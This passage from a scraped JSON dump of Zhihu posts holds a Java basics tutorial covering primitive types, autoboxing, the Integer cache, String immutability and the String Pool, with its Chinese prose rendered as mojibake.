href=\"https://link.zhihu.com/?target=http%3A//www.baeldung.com/java-weakhashmap\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Guide to WeakHashMap in Java</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//alvinalexander.com/java/jwarehouse/apache-tomcat-6.0.16/java/org/apache/el/util/ConcurrentCache.java.shtml\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Tomcat example source code file (ConcurrentCache.java)</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "Java", 
                    "tagLink": "https://api.zhihu.com/topics/19561132"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68499453", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "Java åŸºç¡€", 
            "content": "<p></p><h2>ä¸€ã€æ•°æ®ç±»å‹</h2><h2>åŸºæœ¬ç±»å‹</h2><ul><li>byte/8</li><li>char/16</li><li>short/16</li><li>int/32</li><li>float/32</li><li>long/64</li><li>double/64</li><li>boolean/\\~</li></ul><p>boolean åªæœ‰ä¸¤ä¸ªå€¼ï¼štrueã€falseï¼Œå¯ä»¥ä½¿ç”¨ 1 bit æ¥å­˜å‚¨ï¼Œä½†æ˜¯å…·ä½“å¤§å°æ²¡æœ‰æ˜ç¡®è§„å®šã€‚JVM ä¼šåœ¨ç¼–è¯‘æ—¶æœŸå°† boolean ç±»å‹çš„æ•°æ®è½¬æ¢ä¸º intï¼Œä½¿ç”¨ 1 æ¥è¡¨ç¤º trueï¼Œ0 è¡¨ç¤º falseã€‚JVM æ”¯æŒ boolean æ•°ç»„ï¼Œä½†æ˜¯æ˜¯é€šè¿‡è¯»å†™ byte æ•°ç»„æ¥å®ç°çš„ã€‚</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Primitive Data Types</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/specs/jvms/se8/jvms8.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The JavaÂ® Virtual Machine Specification</a></li></ul><h2>åŒ…è£…ç±»å‹</h2><p>åŸºæœ¬ç±»å‹éƒ½æœ‰å¯¹åº”çš„åŒ…è£…ç±»å‹ï¼ŒåŸºæœ¬ç±»å‹ä¸å…¶å¯¹åº”çš„åŒ…è£…ç±»å‹ä¹‹é—´çš„èµ‹å€¼ä½¿ç”¨è‡ªåŠ¨è£…ç®±ä¸æ‹†ç®±å®Œæˆã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>     <span class=\"c1\">// è£…ç®±\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>         <span class=\"o\">//</span> <span class=\"n\">æ‹†ç®±</span></code></pre></div><h2>ç¼“å­˜æ± </h2><p>new Integer(123) ä¸ Integer.valueOf(123) çš„åŒºåˆ«åœ¨äºï¼š</p><ul><li>new Integer(123) æ¯æ¬¡éƒ½ä¼šæ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼›</li><li>Integer.valueOf(123) ä¼šä½¿ç”¨ç¼“å­˜æ± ä¸­çš„å¯¹è±¡ï¼Œå¤šæ¬¡è°ƒç”¨ä¼šå–å¾—åŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">Integer</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"n\">y</span><span class=\"o\">);</span>    <span class=\"c1\">// false\n</span><span class=\"c1\"></span><span class=\"n\">Integer</span> <span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">Integer</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">z</span> <span class=\"o\">==</span> <span class=\"n\">k</span><span class=\"o\">);</span>   <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>valueOf() æ–¹æ³•çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å…ˆåˆ¤æ–­å€¼æ˜¯å¦åœ¨ç¼“å­˜æ± ä¸­ï¼Œå¦‚æœåœ¨çš„è¯å°±ç›´æ¥è¿”å›ç¼“å­˜æ± çš„å†…å®¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">Integer</span> <span class=\"nf\">valueOf</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&gt;=</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">low</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">high</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">cache</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"o\">(-</span><span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">low</span><span class=\"o\">)];</span>\n    <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>åœ¨ Java 8 ä¸­ï¼ŒInteger ç¼“å­˜æ± çš„å¤§å°é»˜è®¤ä¸º -128\\~127ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">low</span> <span class=\"o\">=</span> <span class=\"o\">-</span><span class=\"n\">128</span><span class=\"o\">;</span>\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">high</span><span class=\"o\">;</span>\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"n\">Integer</span> <span class=\"n\">cache</span><span class=\"o\">[];</span>\n\n<span class=\"kd\">static</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// high value may be configured by property\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">127</span><span class=\"o\">;</span>\n    <span class=\"n\">String</span> <span class=\"n\">integerCacheHighPropValue</span> <span class=\"o\">=</span>\n        <span class=\"n\">sun</span><span class=\"o\">.</span><span class=\"na\">misc</span><span class=\"o\">.</span><span class=\"na\">VM</span><span class=\"o\">.</span><span class=\"na\">getSavedProperty</span><span class=\"o\">(</span><span class=\"s\">&#34;java.lang.Integer.IntegerCache.high&#34;</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">integerCacheHighPropValue</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">parseInt</span><span class=\"o\">(</span><span class=\"n\">integerCacheHighPropValue</span><span class=\"o\">);</span>\n            <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">127</span><span class=\"o\">);</span>\n            <span class=\"c1\">// Maximum array size is Integer.MAX_VALUE\n</span><span class=\"c1\"></span>            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">MAX_VALUE</span> <span class=\"o\">-</span> <span class=\"o\">(-</span><span class=\"n\">low</span><span class=\"o\">)</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">catch</span><span class=\"o\">(</span> <span class=\"n\">NumberFormatException</span> <span class=\"n\">nfe</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// If the property cannot be parsed into an int, ignore it.\n</span><span class=\"c1\"></span>        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">high</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"o\">;</span>\n\n    <span class=\"n\">cache</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">[(</span><span class=\"n\">high</span> <span class=\"o\">-</span> <span class=\"n\">low</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n    <span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">low</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;</span> <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">k</span><span class=\"o\">++)</span>\n        <span class=\"n\">cache</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">j</span><span class=\"o\">++);</span>\n\n    <span class=\"c1\">// range [-128, 127] must be interned (JLS7 5.1.7)\n</span><span class=\"c1\"></span>    <span class=\"k\">assert</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">high</span> <span class=\"o\">&gt;=</span> <span class=\"n\">127</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ç¼–è¯‘å™¨ä¼šåœ¨è‡ªåŠ¨è£…ç®±è¿‡ç¨‹è°ƒç”¨ valueOf() æ–¹æ³•ï¼Œå› æ­¤å¤šä¸ªå€¼ç›¸åŒä¸”å€¼åœ¨ç¼“å­˜æ± èŒƒå›´å†…çš„ Integer å®ä¾‹ä½¿ç”¨è‡ªåŠ¨è£…ç®±æ¥åˆ›å»ºï¼Œé‚£ä¹ˆå°±ä¼šå¼•ç”¨ç›¸åŒçš„å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n<span class=\"n\">Integer</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">m</span> <span class=\"o\">==</span> <span class=\"n\">n</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>åŸºæœ¬ç±»å‹å¯¹åº”çš„ç¼“å†²æ± å¦‚ä¸‹ï¼š</p><ul><li>boolean values true and false</li><li>all byte values</li><li>short values between -128 and 127</li><li>int values between -128 and 127</li><li>char in the range \\u0000 to \\u007F</li></ul><p>åœ¨ä½¿ç”¨è¿™äº›åŸºæœ¬ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»å‹æ—¶ï¼Œå¦‚æœè¯¥æ•°å€¼èŒƒå›´åœ¨ç¼“å†²æ± èŒƒå›´å†…ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ç¼“å†²æ± ä¸­çš„å¯¹è±¡ã€‚</p><p>åœ¨ jdk 1.8 æ‰€æœ‰çš„æ•°å€¼ç±»ç¼“å†²æ± ä¸­ï¼ŒInteger çš„ç¼“å†²æ±  IntegerCache å¾ˆç‰¹æ®Šï¼Œè¿™ä¸ªç¼“å†²æ± çš„ä¸‹ç•Œæ˜¯ - 128ï¼Œä¸Šç•Œé»˜è®¤æ˜¯ 127ï¼Œä½†æ˜¯è¿™ä¸ªä¸Šç•Œæ˜¯å¯è°ƒçš„ï¼Œåœ¨å¯åŠ¨ jvm çš„æ—¶å€™ï¼Œé€šè¿‡ -XX:AutoBoxCacheMax=&lt;size&gt; æ¥æŒ‡å®šè¿™ä¸ªç¼“å†²æ± çš„å¤§å°ï¼Œè¯¥é€‰é¡¹åœ¨ JVM åˆå§‹åŒ–çš„æ—¶å€™ä¼šè®¾å®šä¸€ä¸ªåä¸º java.lang.IntegerCache.high ç³»ç»Ÿå±æ€§ï¼Œç„¶å IntegerCache åˆå§‹åŒ–çš„æ—¶å€™å°±ä¼šè¯»å–è¯¥ç³»ç»Ÿå±æ€§æ¥å†³å®šä¸Šç•Œã€‚</p><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/9030817/differences-between-new-integer123-integer-valueof123-and-just-123\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 </a></p><h2>äºŒã€String</h2><h2>æ¦‚è§ˆ</h2><p>String è¢«å£°æ˜ä¸º finalï¼Œå› æ­¤å®ƒä¸å¯è¢«ç»§æ‰¿ã€‚</p><p>åœ¨ Java 8 ä¸­ï¼ŒString å†…éƒ¨ä½¿ç”¨ char æ•°ç»„å­˜å‚¨æ•°æ®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">String</span>\n    <span class=\"kd\">implements</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">Serializable</span><span class=\"o\">,</span> <span class=\"n\">Comparable</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;,</span> <span class=\"n\">CharSequence</span> <span class=\"o\">{</span>\n    <span class=\"cm\">/** The value is used for character storage. */</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">char</span> <span class=\"n\">value</span><span class=\"o\">[];</span>\n<span class=\"o\">}</span></code></pre></div><p>åœ¨ Java 9 ä¹‹åï¼ŒString ç±»çš„å®ç°æ”¹ç”¨ byte æ•°ç»„å­˜å‚¨å­—ç¬¦ä¸²ï¼ŒåŒæ—¶ä½¿ç”¨ <code>coder</code> æ¥æ ‡è¯†ä½¿ç”¨äº†å“ªç§ç¼–ç ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">String</span>\n    <span class=\"kd\">implements</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">Serializable</span><span class=\"o\">,</span> <span class=\"n\">Comparable</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;,</span> <span class=\"n\">CharSequence</span> <span class=\"o\">{</span>\n    <span class=\"cm\">/** The value is used for character storage. */</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n\n    <span class=\"cm\">/** The identifier of the encoding used to encode the bytes in {@code value}. */</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">byte</span> <span class=\"n\">coder</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>value æ•°ç»„è¢«å£°æ˜ä¸º finalï¼Œè¿™æ„å‘³ç€ value æ•°ç»„åˆå§‹åŒ–ä¹‹åå°±ä¸èƒ½å†å¼•ç”¨å…¶å®ƒæ•°ç»„ã€‚å¹¶ä¸” String å†…éƒ¨æ²¡æœ‰æ”¹å˜ value æ•°ç»„çš„æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥ä¿è¯ String ä¸å¯å˜ã€‚</p><h2>ä¸å¯å˜çš„å¥½å¤„</h2><p><b>1. å¯ä»¥ç¼“å­˜ hash å€¼</b> </p><p>å› ä¸º String çš„ hash å€¼ç»å¸¸è¢«ä½¿ç”¨ï¼Œä¾‹å¦‚ String ç”¨åš HashMap çš„ keyã€‚ä¸å¯å˜çš„ç‰¹æ€§å¯ä»¥ä½¿å¾— hash å€¼ä¹Ÿä¸å¯å˜ï¼Œå› æ­¤åªéœ€è¦è¿›è¡Œä¸€æ¬¡è®¡ç®—ã€‚</p><p><b>2. String Pool çš„éœ€è¦</b> </p><p>å¦‚æœä¸€ä¸ª String å¯¹è±¡å·²ç»è¢«åˆ›å»ºè¿‡äº†ï¼Œé‚£ä¹ˆå°±ä¼šä» String Pool ä¸­å–å¾—å¼•ç”¨ã€‚åªæœ‰ String æ˜¯ä¸å¯å˜çš„ï¼Œæ‰å¯èƒ½ä½¿ç”¨ String Poolã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-b7e94f0c88ab301f3829f92f34071bb4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"482\" data-rawheight=\"393\" class=\"origin_image zh-lightbox-thumb\" width=\"482\" data-original=\"https://pic1.zhimg.com/v2-b7e94f0c88ab301f3829f92f34071bb4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;482&#39; height=&#39;393&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"482\" data-rawheight=\"393\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"482\" data-original=\"https://pic1.zhimg.com/v2-b7e94f0c88ab301f3829f92f34071bb4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-b7e94f0c88ab301f3829f92f34071bb4_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p><b>3. å®‰å…¨æ€§</b> </p><p>String ç»å¸¸ä½œä¸ºå‚æ•°ï¼ŒString ä¸å¯å˜æ€§å¯ä»¥ä¿è¯å‚æ•°ä¸å¯å˜ã€‚ä¾‹å¦‚åœ¨ä½œä¸ºç½‘ç»œè¿æ¥å‚æ•°çš„æƒ…å†µä¸‹å¦‚æœ String æ˜¯å¯å˜çš„ï¼Œé‚£ä¹ˆåœ¨ç½‘ç»œè¿æ¥è¿‡ç¨‹ä¸­ï¼ŒString è¢«æ”¹å˜ï¼Œæ”¹å˜ String å¯¹è±¡çš„é‚£ä¸€æ–¹ä»¥ä¸ºç°åœ¨è¿æ¥çš„æ˜¯å…¶å®ƒä¸»æœºï¼Œè€Œå®é™…æƒ…å†µå´ä¸ä¸€å®šæ˜¯ã€‚</p><p><b>4. çº¿ç¨‹å®‰å…¨</b> </p><p>String ä¸å¯å˜æ€§å¤©ç”Ÿå…·å¤‡çº¿ç¨‹å®‰å…¨ï¼Œå¯ä»¥åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å®‰å…¨åœ°ä½¿ç”¨ã€‚</p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.programcreek.com/2013/04/why-string-is-immutable-in-java/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Program Creek : Why String is immutable in Java?</a></p><h2>String, StringBuffer and StringBuilder</h2><p><b>1. å¯å˜æ€§</b> </p><ul><li>String ä¸å¯å˜</li><li>StringBuffer å’Œ StringBuilder å¯å˜</li></ul><p><b>2. çº¿ç¨‹å®‰å…¨</b> </p><ul><li>String ä¸å¯å˜ï¼Œå› æ­¤æ˜¯çº¿ç¨‹å®‰å…¨çš„</li><li>StringBuilder ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„</li><li>StringBuffer æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå†…éƒ¨ä½¿ç”¨ synchronized è¿›è¡ŒåŒæ­¥</li></ul><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/2971315/string-stringbuffer-and-stringbuilder\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : String, StringBuffer, and StringBuilder</a></p><h2>String Pool</h2><p>å­—ç¬¦ä¸²å¸¸é‡æ± ï¼ˆString Poolï¼‰ä¿å­˜ç€æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢é‡ï¼ˆliteral stringsï¼‰ï¼Œè¿™äº›å­—é¢é‡åœ¨ç¼–è¯‘æ—¶æœŸå°±ç¡®å®šã€‚ä¸ä»…å¦‚æ­¤ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ String çš„ intern() æ–¹æ³•åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å°†å­—ç¬¦ä¸²æ·»åŠ åˆ° String Pool ä¸­ã€‚</p><p>å½“ä¸€ä¸ªå­—ç¬¦ä¸²è°ƒç”¨ intern() æ–¹æ³•æ—¶ï¼Œå¦‚æœ String Pool ä¸­å·²ç»å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å’Œè¯¥å­—ç¬¦ä¸²å€¼ç›¸ç­‰ï¼ˆä½¿ç”¨ equals() æ–¹æ³•è¿›è¡Œç¡®å®šï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å› String Pool ä¸­å­—ç¬¦ä¸²çš„å¼•ç”¨ï¼›å¦åˆ™ï¼Œå°±ä¼šåœ¨ String Pool ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–°å­—ç¬¦ä¸²çš„å¼•ç”¨ã€‚</p><p>ä¸‹é¢ç¤ºä¾‹ä¸­ï¼Œs1 å’Œ s2 é‡‡ç”¨ new String() çš„æ–¹å¼æ–°å»ºäº†ä¸¤ä¸ªä¸åŒå­—ç¬¦ä¸²ï¼Œè€Œ s3 å’Œ s4 æ˜¯é€šè¿‡ s1.intern() æ–¹æ³•å–å¾—ä¸€ä¸ªå­—ç¬¦ä¸²å¼•ç”¨ã€‚intern() é¦–å…ˆæŠŠ s1 å¼•ç”¨çš„å­—ç¬¦ä¸²æ”¾åˆ° String Pool ä¸­ï¼Œç„¶åè¿”å›è¿™ä¸ªå­—ç¬¦ä¸²å¼•ç”¨ã€‚å› æ­¤ s3 å’Œ s4 å¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"s\">&#34;aaa&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">String</span> <span class=\"n\">s2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"s\">&#34;aaa&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">s1</span> <span class=\"o\">==</span> <span class=\"n\">s2</span><span class=\"o\">);</span>           <span class=\"c1\">// false\n</span><span class=\"c1\"></span><span class=\"n\">String</span> <span class=\"n\">s3</span> <span class=\"o\">=</span> <span class=\"n\">s1</span><span class=\"o\">.</span><span class=\"na\">intern</span><span class=\"o\">();</span>\n<span class=\"n\">String</span> <span class=\"n\">s4</span> <span class=\"o\">=</span> <span class=\"n\">s1</span><span class=\"o\">.</span><span class=\"na\">intern</span><span class=\"o\">();</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">s3</span> <span class=\"o\">==</span> <span class=\"n\">s4</span><span class=\"o\">);</span>           <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>å¦‚æœæ˜¯é‡‡ç”¨ &#34;bbb&#34; è¿™ç§å­—é¢é‡çš„å½¢å¼åˆ›å»ºå­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨åœ°å°†å­—ç¬¦ä¸²æ”¾å…¥ String Pool ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">s5</span> <span class=\"o\">=</span> <span class=\"s\">&#34;bbb&#34;</span><span class=\"o\">;</span>\n<span class=\"n\">String</span> <span class=\"n\">s6</span> <span class=\"o\">=</span> <span class=\"s\">&#34;bbb&#34;</span><span class=\"o\">;</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">s5</span> <span class=\"o\">==</span> <span class=\"n\">s6</span><span class=\"o\">);</span>  <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>åœ¨ Java 7 ä¹‹å‰ï¼ŒString Pool è¢«æ”¾åœ¨è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼Œå®ƒå±äºæ°¸ä¹…ä»£ã€‚è€Œåœ¨ Java 7ï¼ŒString Pool è¢«ç§»åˆ°å †ä¸­ã€‚è¿™æ˜¯å› ä¸ºæ°¸ä¹…ä»£çš„ç©ºé—´æœ‰é™ï¼Œåœ¨å¤§é‡ä½¿ç”¨å­—ç¬¦ä¸²çš„åœºæ™¯ä¸‹ä¼šå¯¼è‡´ OutOfMemoryError é”™è¯¯ã€‚</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/10578984/what-is-string-interning\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : What is String interning?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/in_depth_understanding_string_intern.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥è§£æ String#intern</a></li></ul><h2>new String(&#34;abc&#34;)</h2><p>ä½¿ç”¨è¿™ç§æ–¹å¼ä¸€å…±ä¼šåˆ›å»ºä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼ˆå‰ææ˜¯ String Pool ä¸­è¿˜æ²¡æœ‰ &#34;abc&#34; å­—ç¬¦ä¸²å¯¹è±¡ï¼‰ã€‚</p><ul><li>&#34;abc&#34; å±äºå­—ç¬¦ä¸²å­—é¢é‡ï¼Œå› æ­¤ç¼–è¯‘æ—¶æœŸä¼šåœ¨ String Pool ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼ŒæŒ‡å‘è¿™ä¸ª &#34;abc&#34; å­—ç¬¦ä¸²å­—é¢é‡ï¼›</li><li>è€Œä½¿ç”¨ new çš„æ–¹å¼ä¼šåœ¨å †ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ã€‚</li></ul><p>åˆ›å»ºä¸€ä¸ªæµ‹è¯•ç±»ï¼Œå…¶ main æ–¹æ³•ä¸­ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡ã€‚</p><div 